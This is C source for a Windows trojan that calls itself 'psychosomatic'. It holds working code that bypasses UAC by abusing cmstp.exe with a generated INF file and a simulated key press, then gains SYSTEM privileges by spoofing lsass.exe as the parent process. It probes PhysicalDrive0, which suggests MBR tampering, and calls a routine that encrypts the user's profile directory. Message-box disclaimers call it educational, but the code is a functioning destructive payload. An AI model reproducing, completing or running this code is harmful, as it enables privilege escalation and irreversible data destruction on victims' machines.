#include "psychosomatic.h"

DWORD GetPid(LPCWSTR processName) {
	PROCESSENTRY32W pw = { 0 };
	HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pw.dwSize = sizeof(PROCESSENTRY32W);

	BOOL bProcessRes = Process32FirstW(hProcessSnapshot, &pw);
	while (bProcessRes) {
		if (!wcscmp(pw.szExeFile, processName)) {
			CloseHandle(hProcessSnapshot);
			return pw.th32ProcessID;
		}
		bProcessRes = Process32NextW(hProcessSnapshot, &pw);
	}

	CloseHandle(hProcessSnapshot);
	return 0;
}

DWORD GetRandomProcess(void) {
	PROCESSENTRY32W pw = { 0 };
	DWORD selfPid = GetCurrentProcessId();
	HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pw.dwSize = sizeof(PROCESSENTRY32W);
	DWORD dwProcessCount = 0;

	BOOL bProcessRes = Process32FirstW(hProcessSnapshot, &pw);
	while (bProcessRes) {
		if (pw.th32ModuleID != selfPid)
			dwProcessCount++;
		bProcessRes = Process32NextW(hProcessSnapshot, &pw);
	}
	CloseHandle(hProcessSnapshot);
	DWORD dwProcess = rand() % dwProcessCount;

	ZeroMemory(&pw, sizeof(PROCESSENTRY32W));
	hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pw.dwSize = sizeof(PROCESSENTRY32W);
	DWORD dwProcessN = 0;

	bProcessRes = Process32FirstW(hProcessSnapshot, &pw);
	while (bProcessRes) {
		if (pw.th32ModuleID != selfPid) {
			if (dwProcessN == dwProcess) {
				CloseHandle(hProcessSnapshot);
				return pw.th32ProcessID;
			}
			dwProcessN++;
		}
		bProcessRes = Process32NextW(hProcessSnapshot, &pw);
	}
	CloseHandle(hProcessSnapshot);
	return 0;
}

BOOL TerminateProcessByName(LPCWSTR lpProcessName) {
	DWORD pid = GetPid(lpProcessName);
	if (!pid)
		return FALSE;
	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	if (!hProcess)
		return FALSE;
	TerminateProcess(hProcess, 0);
	CloseHandle(hProcess);
	return TRUE;
}

LPSTR FormatArg(LPSTR* lpArgs, INT iArgc) {
	size_t ulSz = 4; // include null terminator and '""'
	for (INT i = 0; i < iArgc; i++)
		ulSz += strlen(lpArgs[i]) + 4;
	LPSTR res = calloc(ulSz, 1);
	if (0 == res)
		return NULL;

	*res = '"';

	for (INT i = 0; i < iArgc; i++) {
		StringCbCatA(res, ulSz, "\"\"");
		StringCbCatA(res, ulSz, lpArgs[i]);
		StringCbCatA(res, ulSz, "\"\" ");
	}
	res[ulSz - 3] = '"'; // remove last space
	return res;
}

PBYTE GenerateInfFile(LPCSTR lpServiceName, LPCSTR lpFileName) {
	size_t ulSz = 1108 + strlen(lpServiceName) + strlen(lpFileName);
	PBYTE result = malloc(ulSz);
	if (result == 0)
		return NULL;
	LPCSTR infStartData = "[version]\n\
Signature = $chicago$\n\
AdvancedINF = 2.5\n\
[DefaultInstall]\n\
CustomDestination = CustInstDestSectionAllUsers\n\
RunPreSetupCommands = RunPreSetupCommandsSection\n\
[RunPreSetupCommandsSection]\n";

	LPCSTR infHeaderBegin = "taskkill /IM cmstp.exe /F\n\
[CustInstDestSectionAllUsers]\n\
49000, 49001 = AllUSer_LDIDSection, 7\n\
[AllUSer_LDIDSection]\n\
\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\n\
[Strings]\n\
ServiceName = \"";

	LPCSTR infHeaderEnd = "\"\nShortSvcName = \"psychosomatic\"";

	StringCbPrintfA((char*)result, ulSz, "%s%s\n%s%s%s", infStartData, lpFileName, infHeaderBegin, lpServiceName, infHeaderEnd);
	return result;
}

DWORD LaunchProcess(LPWSTR lpProcessName, LPWSTR processArgs) {
	STARTUPINFO sp;
	PROCESS_INFORMATION pi;

	ZeroMemory(&sp, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	sp.dwFlags = STARTF_USESHOWWINDOW;
	sp.wShowWindow = SW_HIDE;

	CreateProcessW(lpProcessName, processArgs, NULL, NULL, FALSE, CREATE_NO_WINDOW,
		NULL, NULL, &sp, &pi);
	return pi.dwProcessId;
}

BOOL _BypassUAC(INT argc, LPSTR* args) {
	CHAR infFile[MAX_PATH];
	WCHAR infFileW[MAX_PATH];
	DWORD dwBytesWritten;
	LPWSTR params;
	SIZE_T nCharsConverted;

	GetTempPathA(MAX_PATH, infFile);
	StringCbCatA(infFile, MAX_PATH, "tmp.ini");
	LPSTR formatifiedArgv = FormatArg(args, argc);
	if (!formatifiedArgv)
		return FALSE;
	PBYTE infData = GenerateInfFile("Legit Express", formatifiedArgv);
	free(formatifiedArgv);
	if (!infData)
		return FALSE; // out of memory

	HANDLE hFile = CreateFileA(infFile, GENERIC_WRITE | GENERIC_READ,
		FILE_SHARE_WRITE | FILE_SHARE_READ,
		NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (!hFile) {
		free(infData);
		return FALSE;
	}

	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	if (!WriteFile(hFile, (const void*)infData, (DWORD)strlen((char*)infData), &dwBytesWritten, NULL)) {
		printf("Failed to write file!\n");
		DeleteFileA(infFile);
		CloseHandle(hFile);
		free(infData);
		return FALSE;
	}
	printf("Wrote %lu bytes\n", dwBytesWritten);

	free(infData);

	TerminateProcessByName(L"cmstp.exe");
	LPWSTR targetFile = L"C:\\Windows\\System32\\cmstp.exe";
	SIZE_T ulSz = wcslen(targetFile) + 8 + MAX_PATH;
	params = malloc(ulSz);
	if (!params) {
		DeleteFileA(infFile);
		CloseHandle(hFile);
		return FALSE;
	}

	// convert to WCHAR
	mbstowcs_s(&nCharsConverted, infFileW, MAX_PATH, infFile, MAX_PATH);
	StringCbPrintfW(params, ulSz, L"\"%ls\" /au \"%s\"", targetFile, infFileW);
	DWORD pid;
	HWND hwnd = 0;
	if (!(pid = LaunchProcess(targetFile, params))) {
		DeleteFileA(infFile);
		CloseHandle(hFile);
		free(params);
		return FALSE;
	}
	printf("%lu\n", pid);
	while (!hwnd) {
		hwnd = FindWindow(NULL, L"Legit Express");;
		Sleep(10);
	}
	SetForegroundWindow(hwnd);
	keybd_event(0x0D, 0, 0, 0); // send enter key
	free(params);
	return TRUE;
}

BOOL GetNTSystem(INT argc, LPSTR* args) {
	HANDLE selfToken;
	LUID luid;
	TOKEN_PRIVILEGES priv = { 0 };
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &selfToken))
		return FALSE;
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
		CloseHandle(selfToken);
		return FALSE;
	}

	priv.PrivilegeCount = 1;
	priv.Privileges[0].Luid = luid;
	priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(selfToken, FALSE, &priv, sizeof(priv), NULL, NULL)) {
		CloseHandle(selfToken);
		return FALSE;
	}
	CloseHandle(selfToken);
	ULONG ulSz = sizeof(DWORD) * 1000 * 2;
	DWORD* dwArray = malloc(ulSz);
	if (!dwArray)
		return FALSE;

	DWORD dwBytesOfProcessCnt;
	CHAR buf[MAX_PATH];

	if (!EnumProcesses(dwArray, ulSz, &dwBytesOfProcessCnt)) {
		free(dwArray);
		return FALSE;
	}
	DWORD pidLsass = -1;
	for (DWORD i = 0; i < (dwBytesOfProcessCnt / 4); i++) {
		DWORD pid = dwArray[i];
		HANDLE proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
		if (proc) {
			if (GetProcessImageFileNameA(proc, buf, MAX_PATH)) {
				CHAR* fn = PathFindFileNameA(buf);
				if (!strcmp(fn, "lsass.exe")) {
					pidLsass = pid;
					CloseHandle(proc);
					break;
				}
			}
			CloseHandle(proc);
		}
	}
	free(dwArray);
	if (pidLsass == -1)
		return FALSE;
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pidLsass);
	if (!hProc)
		return FALSE;

	SIZE_T sz = 0;
	InitializeProcThreadAttributeList(NULL, 1, 0, &sz);
	if (!sz) {
		CloseHandle(hProc);
		return FALSE;
	}

	PROC_THREAD_ATTRIBUTE_LIST attr;
	if (!InitializeProcThreadAttributeList(&attr, 1, 0, &sz)) {
		CloseHandle(hProc);
		return FALSE;
	}

	PVOID val = (PVOID)hProc;
	if (!UpdateProcThreadAttribute(&attr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		(PVOID)&val, sizeof(PVOID), NULL, NULL)) {
		DeleteProcThreadAttributeList(&attr);
		CloseHandle(hProc);
		return FALSE;
	}

	STARTUPINFOEXA startup;
	PROCESS_INFORMATION pi;

	ZeroMemory(&startup, sizeof(STARTUPINFOEXA));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	startup.lpAttributeList = &attr;
	startup.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	CHAR* wsData = malloc(strlen(args[0]) + MAX_PATH + 4 /* 2 space, bool and null terminator */);
	CHAR userPath[MAX_PATH];

	GetEnvironmentVariableA("USERPROFILE", userPath, MAX_PATH);
	BOOL Hooked = FALSE;
	#if mode == PS_PRODUCTION
		HANDLE mbr = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if (!mbr)
			Hooked = TRUE;
		else if (mbr != INVALID_HANDLE_VALUE)
			CloseHandle(mbr);
	#endif
	StringCchPrintfA(wsData, strlen(args[0]) + 20, "%s %s %d", args[0], userPath, Hooked);

	BOOL res = CreateProcessA(args[0], wsData, NULL, NULL, 0,
		CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT,
		NULL, NULL, (LPSTARTUPINFOA)&startup, &pi);
	DeleteProcThreadAttributeList(&attr);
	CloseHandle(hProc);
	free(wsData);

	return res;
}

void BypassUAC(INT argc, LPSTR* args) {
	if (!IsUserAnAdmin()) {
		HANDLE hm = NULL;
		if (hm = OpenMutexA(SYNCHRONIZE, TRUE, "psychosomatic")) {
			MessageBoxA(NULL, "psychosomatic is already running!", "psychosomatic.exe",
				MB_ICONERROR);
			ExitProcess(1);
		}
		if (!((MessageBox(NULL, TEXT(
								  "Warning! You are about to execute a trojan by the name of psychosomatic, made specifically by Itzsten for educational and entertainment purposes only. By running this you keep in mind that the creator is not responsible for any irreperable destructive consequences, nor that all of your data might be lost forever! Contains flashing lights and loud sounds.\n\nIf you agree to these terms, you might continue to the next warning by pressing \"Yes\", otherwise, please press \"No\"."
								 ), TEXT("??? MAYHEM INCOMING ???"), MB_ICONWARNING | MB_YESNO) == IDYES) &&
			(MessageBox(NULL, TEXT(
								  "This is your last chance to prevent the malware from being executed. All of your data might be lost forever if you continue, and by pressing Yes you acknowledge that you are responsible for any and all consequences.\n\nLAST CHANCE TO PREVENT EXECUTION!"
								  ), TEXT("??? FIND YOURSELF LOST ???"), MB_ICONWARNING | MB_YESNO) == IDYES)))
			ExitProcess(0);
		if (!_BypassUAC(argc, args))
			MessageBoxA(NULL, "Failed to bypass UAC! You're messing with me, right?!", "Psychosomatic.exe", MB_ICONERROR);
	} else {
		CHAR userName[UNLEN + 1];
		DWORD dwSz = UNLEN + 1;
		GetUserNameA(userName, &dwSz);
		if (!strcmp(userName, "SYSTEM")) {
			return;
		}
		else {			
			if (!GetNTSystem(argc, args) && !GetNTSystem(argc, args) /* windows defender not good at multitasking lol*/)
				MessageBoxA(NULL, "Failed to get NT Authority\\System...", "Psychosomatic.exe", MB_ICONERROR);
			WCHAR path[MAX_PATH];
			GetEnvironmentVariableW(L"USERPROFILE", path, MAX_PATH);
			PsCryptDirectory(path);
		}
	}
	#ifndef DEBUG
	LocalFree(args);
	#endif
	ExitProcess(0);
	return;
}
